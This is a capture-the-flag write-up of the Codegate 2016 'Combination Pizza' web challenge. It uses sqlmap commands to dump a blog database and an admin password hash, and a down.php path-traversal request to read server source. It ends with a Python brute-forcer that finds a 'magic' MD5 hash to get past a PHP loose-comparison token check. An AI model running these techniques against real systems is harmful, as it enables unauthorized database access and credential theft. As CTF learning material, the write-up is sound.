---
id: 633
title: 'Codegate 2016 - Combination Pizza - Web Challenge'
date: 2016-03-14T10:27:58+00:00
author: Kris
layout: post
guid: https://ctf.rip/?p=633
permalink: /codegate-2016-combination-pizza-web-challenge/
post_views_count:
  - "2405"
themepixels_post_link_target:
  - 'yes'
themepixels_enable_post_header:
  - default
themepixels_enable_post_meta_single:
  - default
themepixels_enable_post_featured_content:
  - default
themepixels_enable_post_categories:
  - default
themepixels_enable_post_tags:
  - default
themepixels_enable_post_share:
  - default
themepixels_enable_post_author_info_box:
  - default
themepixels_enable_related_posts:
  - default
themepixels_enable_post_next_prev_links:
  - default
themepixels_enable_topbar:
  - default
themepixels_enable_sticky_header:
  - default
themepixels_header_layout:
  - default
themepixels_site_layout:
  - default
themepixels_sidebar_position:
  - default
image: /images/2016/03/pizza-660x562.png
categories:
  - Write-Ups
tags:
  - codegate
  - sql injection
---
Who doesn't love Pizza? Well actually I can't stand cheese but whatever, this challenge was fun but also quite easy. I started with standard recon, looking for low hanging fruit. I stumbled across the "blog" subsection of the website where there was a hint of a possible test point.

  * `http://175.119.158.137:9242/f00885da9ad9ad5fcccaa8fc1217e3ae/read.php?id=1`

Not usually thinking this would lead to too much, I asked SQLMap to probe it a little bit for me and to my surprise it quickly identified the link WAS vulnerable in a trivial manner. We used SQLMap to map the database and pull data at our leisure:

We asked for the list of databases first:



```
sqlmap -u 'http://175.119.158.137:9242/ f00885da9ad9ad5fcccaa8fc1217e3ae/read.php?id=1' --dbs
...
available databases [2]:
[*] blog_db
[*] information_schema
```

Cool, we then go on to enumerate the tables and then fields. We can recover the hashed password this way:

```
sqlmap -u 'http://175.119.158.137:9242/ f00885da9ad9ad5fcccaa8fc1217e3ae/read.php?id=1' --tables -D blog_db
...
Database: blog_db
[2 tables]
+-------+
| blog  |
| login |
+-------+
```

Login sounds juicy we might find our Admin's creds there?

```
sqlmap -u 'http://175.119.158.137:9242/ f00885da9ad9ad5fcccaa8fc1217e3ae/read.php?id=1' -D blog_db -T login --dump

...
Database: blog_db
Table: login
[1 entry]
+--------------------------------------------+--------+
| pass                                       | user   |
+--------------------------------------------+--------+
| 70e76a15da00e6301ade718cc9416f79           | Admin  |
+--------------------------------------------+--------+
```

Well the hashed version, we crack this md5 and found the password is just "adminpw". So what else do we need? We need something called a "token" but yet we don't even know how that was generated so we need to dig deeper. I decide to dump the blog table next:

```
sqlmap -u 'http://175.119.158.137:9242/ f00885da9ad9ad5fcccaa8fc1217e3ae/read.php?id=1' -D blog_db -T blog --dump
...
+----+-----------------------------------------+--------+----------------------+---------+------------+------------------------------------------------------------------------------------------------------+
| id | file                                    | type   | title                | writer  | datetime   | contents                                                                                             |
+----+-----------------------------------------+--------+----------------------+---------+------------+------------------------------------------------------------------------------------------------------+
| 0  | <a href="down.php?fn=poem.jpg">down</a> | hidden | Secret File          | Admin   | 2016-03-09 | <p>Once More...</p>                                                                                  |
| 1  | <blank>                                 | show   | Welcome to our site! | Manager | 2016-01-01 | <p>It's finally here!</p><p>We are proud to announce the launch of our newly redesigned website.</p> |
| 2  | <blank>                                 | show   | Blog Test            | Manager | 2016-02-13 | <p>Test</p><p>Test Test</p>                                                                          |
| 3  | <blank>                                 | show   | Updating NEW content | Manager | 2016-03-03 | <p>Updating NEW content...</p><p>Admin can read this ?</p>                                           |
+----+-----------------------------------------+--------+----------------------+---------+------------+------------------------------------------------------------------------------------------------------+
```

Wait a minute! What's that "hidden" post. Interesting, let's download the poem.jpg and see (naive me!).

<img class="alignnone size-full wp-image-634" src="/images/2016/03/poem.jpg" alt="poem" width="800" height="800" srcset="/images/2016/03/poem.jpg 800w, /images/2016/03/poem-150x150.jpg 150w, /images/2016/03/poem-300x300.jpg 300w, /images/2016/03/poem-768x768.jpg 768w, /images/2016/03/poem-660x660.jpg 660w" sizes="(max-width: 800px) 100vw, 800px" />

Welp thats no use. But what about down.php, what if we try other files. Well as luck may have it it works:

```
root@kali:~/codegate/web/pizza# curl -L 'http://175.119.158. 137:9242/f00885da9ad9ad5fcccaa8fc1217e3ae/down.php?fn=down.php'

    if(isset($_GET['fn']))
    {
        $filename = $_GET['fn'];
        $path = './upfile/' . $filename;

        Header("Content-type: application/octet-stream");
        Header("Content-Length: " . filesize($path));
        Header("Content-Disposition: attachment; filename=$filename");
        Header("Cache-Control: no-cache");

        if(is_file($path))
        {
            $fp = fopen($path, "r");
            if(!fpassthru($fp))
            fclose($fp);
        }
    }
?>

```

We try and leak other files and find that the rest of the site lives in one directory up. We find the login source code here:

```
root@kali:~/codegate/web/pizza# curl -L 'http://175.119.158. 137:9242/f00885da9ad9ad5fcccaa8fc1217e3ae/down.php?fn=../login_ck.php'
<?php
    include "./lib/for_flag.php";
    include "./lib/lib.php";

    $user = mysql_real_escape_string($_POST['user']);
    $pass = mysql_real_escape_string($_POST['pass']);
    $token = $_POST['token'];

    $que = "select user from login where user='{$user}' and pass=md5('{$pass}')";
    $result = mysql_query($que);
    $row = mysql_fetch_array($result);

    if($row['user'] == 'Admin')
    {
        if(md5("blog".$token) == '0e689047178306969035064392896674')
        {
            echo "good job !!!
FLAG : "</span>.$flag."</b>";
        }
...
```



Now we know the construction of the token which appears to be a MD5 hash salted with the word "blog". It could ordinarily take a long time to find the magic number that results in this hash but we're in luck because this particular hash has a backdoor in it. By that we mean the method the PHP code does the comparison between the input and the hash is flawed. The flaw exists because PHP treats any string in the format 0eN as a number. So if we can find any other hash that meats our constraints and consists of the form 0eN then this condition will evaluate to true. I have the following code for this task:

```
#!/usr/bin/python

#
# Searches for an MD5 hash begining with 0e and containing only digits thereafter
#

import hashlib
import string
import itertools
import sys

salt = "blog"
example = "0e689047178306969035064392896674"
prefix = "0e"

assert(example[:2] == prefix)
assert(example[2:].isdigit())

print "[*] Searching for md5($salt.$string) == 0eN. where salt = " + salt

for i in itertools.product(string.ascii_letters,repeat = int(sys.argv[1])):
  pw = "".join(i)
  ma = hashlib.md5()
  salted = salt + pw
  ma.update(salted)

  if ma.hexdigest()[:2] == prefix:
    if ma.hexdigest()[2:].isdigit():
      print "[*] Found: " + ma.hexdigest() + " that comes from " + pw

```

We run and find a solution within 2 minutes:

```
root@kali:~/codegate/web/pizza# ./fpwmp.py 9
[*] Searching for md5($salt.$string) == 0eN where salt = blog
[*] Found: 0e371536854758618708164305994357 that comes from aaaajBaRM
```

So now we can login with:

  * Username: Admin
  * Password: adminpw
  * Token: aaaajBaRM

We do so and get the flag!